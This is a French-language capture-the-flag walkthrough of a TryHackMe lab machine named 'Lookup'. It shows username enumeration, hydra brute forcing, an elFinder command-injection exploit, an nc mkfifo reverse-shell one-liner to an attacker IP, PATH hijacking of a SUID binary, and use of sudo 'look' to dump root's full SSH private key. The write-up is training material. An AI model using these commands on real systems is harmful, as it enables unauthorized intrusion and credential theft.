# Lookup

Description : Test your enumeration skills on this boot-to-root machine.

```jsx
export target=10.81.158.61
```

# Enumeration

## Nmap

```jsx
nmap -A -p 22,80 $target -T4
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-19 11:37 CET
Nmap scan report for lookup.thm (10.81.189.222)
Host is up (0.051s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 54:38:a3:38:c6:80:48:8e:c0:26:d9:9a:7d:95:78:96 (RSA)
|   256 06:c2:02:35:bf:61:ae:75:73:c6:8c:a6:3e:64:7b:4a (ECDSA)
|_  256 5f:6a:fb:59:6d:11:db:fb:39:aa:6c:40:ea:2d:15:69 (ED25519)

80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Login Page
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.19 (96%), Linux 4.15 (96%), Linux 5.4 (96%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Adtran 424RG FTTH gateway (92%), Android 9 - 10 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops                                                                                                                                     
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Webspider

```jsx
./webspider file -u "http://lookup.thm" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,html,js,txt,zip -t 50
=================================================================
Webspider v0.1 | 2026-01-19 11:53:38 | By Arnold Edwin (Hackthus)
=================================================================
[*] Cible       : http://lookup.thm
[*] Wordlist    : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[*] Threads     : 50
[*] Timeout     : 10s
[*] Extensions  : php, html, js, txt, zip
=================================================================
Demarrage Webspider en mode File Enumeration
=================================================================
[+] Trouvé [status:200] [size:719.0B] → http://lookup.thm/index.php             
[+] Trouvé [status:200] [size:1.0B] → http://lookup.thm/login.php     
```

Un portail de connexion   → http://lookup.thm/index.php

![image.png](image.png)

## Vhost Discovery

Nothing

## User Enumeration

Nous pouvons observer que les réponse change dans la réponse du serveur en fonction des informations envoyer.

Nous pouvons en déduire que admin est validé en fonction des résultats

![image.png](image%201.png)

Tandis avec un autre username nous obtenons une réponse différente

![image.png](image%202.png)

Nous allons utiliser le script python suivant pour l’énumération d’autre utilisateur que admin

```jsx
import requests

# Define the target URL
url = "http://lookup.thm/login.php"

# Define the file path containing usernames
file_path = "/usr/share/seclists/Usernames/Names/names.txt"

# Read the file and process each line
try:
    with open(file_path, "r") as file:
        for line in file:
            username = line.strip()
            if not username:
                continue  # Skip empty lines
            
            # Prepare the POST data
            data = {
                "username": username,
                "password": "password"  # Fixed password for testing
            }

            # Send the POST request
            response = requests.post(url, data=data)
            
            # Check the response content
            if "Wrong password" in response.text:
                print(f"Username found: {username}")
            elif "wrong username" in response.text:
                continue  # Silent continuation for wrong usernames
except FileNotFoundError:
    print(f"Error: The file {file_path} does not exist.")
except requests.RequestException as e:
    print(f"Error: An HTTP request error occurred: {e}")
```

Nou obtenons le résultat suivant 

```jsx
┌──(hackthus💀kali)-[~/Workspace/Tryhackme/Lookup]
└─$ python enum_user.py
Username found: admin
Username found: jose
```

## Brute Force (hydra)

Nous allons brute force l’utilisateur jose

```jsx
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -V

[80][http-post-form] host: lookup.thm   login: jose   password: password123
1 of 1 target successfully completed, 1 valid password found
```

## Valid crendentials

 login: jose   password: password123

## ElFinder

Apres la connection nous sommes redirigé vers cette interface (on dirait une sorte de gestionnaire de fichiers)

![image.png](image%203.png)

### Files content

- user.txt

```jsx
earthy
fiduciary
weighted
outbound
```

![image.png](image%204.png)

- Version du logiciel : 2.1.47

![image.png](image%205.png)

## Searchsploit

```jsx
                                                                                                                     
root@kali:/home/hackthus/Workspace/Tryhackme/Lookup# searchsploit elfinder
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
elFinder 2 - Remote Command Execution (via File Creation)                           | php/webapps/36925.py
elFinder 2.1.47 - 'PHP connector' Command Injection                                 | php/webapps/46481.py
elFinder PHP Connector < 2.1.48 - 'exiftran' Command Injection (Metasploit)         | php/remote/46539.rb
elFinder Web file manager Version - 2.1.53 Remote Command Execution                 | php/webapps/51864.txt
------------------------------------------------------------------------------------ -----------------------
```

Nous gagnons un shell meterpreter 

![image.png](image%206.png)

## Stabilisation du shell (reverse shell)

Nous utilisons reverse shell generator en ligne → [https://www.revshells.com/](https://www.revshells.com/)

![image.png](image%207.png)

```jsx
meterpreter > shell
Process 1426 created.
Channel 0 created.
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.128.196 9001 >/tmp/f
rm: cannot remove '/tmp/f': No such file or directory
```

![image.png](image%208.png)

## Post Exploitation

Stabilisation du shell

```jsx
$ export TERM=xterm
$ bash -i
bash: cannot set terminal process group (818): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-82-169-164:/var/www/files.lookup.thm/public_html/elFinder/php$ 
```

## Users Enumeration

![image.png](image%209.png)

![image.png](image%2010.png)

## Elevation de privileges

Recherche des SUID et GUID

```jsx
find / -perm /4000 2>/dev/null
```

![image.png](image%2011.png)

```jsx
www-data@ip-10-82-169-164:/var/www/files.lookup.thm/public_html/elFinder/php$ ls -al /usr/sbin/pwm
 -al /usr/sbin/pwm
-rwsr-sr-x 1 root root 17176 Jan 11  2024 /usr/sbin/pwm

```

Exécutons le programme pour observé son comportement 

Le programme utilise la commande id pour extraire le username et user ID (UID) de l’utilisateur qui exécute le programme pour lire un fichier .passwords

![image.png](image%2012.png)

Notre fichier  `id` retournera le  `id`de la  `think`utilisateur, et  `pwm`imprimera le  `.passwords`Fichier de l'identifiant d'utilisateur retourné.

```jsx
www-data@ip-10-82-169-164:/home/think$ cat > /tmp/id << EOF
#!/bin/bash
echo '$(id think)'cat > /tmp/id << EOF
> #!/bin/bash
> EOF
echo '$(id think)'EOF
> 
EOF

www-data@ip-10-82-169-164:/home/think$ cat /tmp/id
#!/bin/bash
echo 'uid=1000(think) gid=1000(think) groups=1000(think)'EOF

www-data@ip-10-82-169-164:/home/think$ chmod +x /tmp/id

www-data@ip-10-82-169-164:/home/think$ ls -al /tmp/id
-rwxr-xr-x 1 www-data www-data 76 Jan 22 15:17 /tmp/id

www-data@ip-10-82-169-164:/home/think$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH

www-data@ip-10-82-169-164:/home/think$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
www-data@ip-10-82-169-164:/home/think$ cd /tmp

```

Sorti du fichier .passwords dans le repertoitre de l’utilisateur think

![image.png](image%2013.png)

## SSH

### Brute Force (hydra)

```jsx
hackthus@kali:~/Workspace/Tryhackme/Lookup$ hydra -l think -P passwords.txt  ssh://$target   
[22][ssh] host: 10.82.169.164   login: think   password: josemario.AKA(think)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-22 16:39:53

```

Credentials : login: think   password: josemario.AKA(think)

## Enumeration (post exploitation)

![image.png](image%2014.png)

```jsx
think@ip-10-82-169-164:~$ sudo look
usage: look [-bdf] [-t char] string [file ...]
```

Nous recherchons sur GTFObins → : [https://gtfobins.org/gtfobins/look/](https://gtfobins.org/gtfobins/look/)

![image.png](image%2015.png)

Nous pous utiliser se programme pour lire le fichier ssh de l’utilisateur root

```jsx
think@ip-10-82-169-164:~$ LFILE=/root/.ssh/id_rsa
think@ip-10-82-169-164:~$ sudo look '' "$LFILE"

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

Nous utilisons cette clé privé pour nous connecté en tant root via ssh 

```jsx
root@kali:/home/hackthus/Workspace/Tryhackme/Lookup# ssh -i priv_ssh_key_root root@$target

Last login: Wed May 28 19:30:26 2025 from 10.23.8.228
root@ip-10-82-169-164:~#  
```

![image.png](image%2016.png)

![image.png](image%2017.png)

FIN

By hackthus  :-)